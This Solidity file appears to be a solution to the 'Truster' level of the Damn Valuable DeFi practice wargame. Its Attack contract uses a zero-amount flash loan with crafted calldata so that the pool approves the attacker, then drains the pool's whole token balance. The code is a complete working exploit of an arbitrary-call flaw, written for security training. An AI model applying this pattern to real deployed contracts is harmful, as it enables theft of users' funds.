// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import { DamnValuableToken, TrusterLenderPool } from "src/03-Truster/TrusterLenderPool.sol";

contract Attack {
    address immutable player;
    TrusterLenderPool immutable pool;

    constructor(TrusterLenderPool _pool) {
        pool = _pool;
        player = msg.sender;
    }

    function attack() external {
        DamnValuableToken token = pool.token();
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), amount);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), player, amount);
    }
}
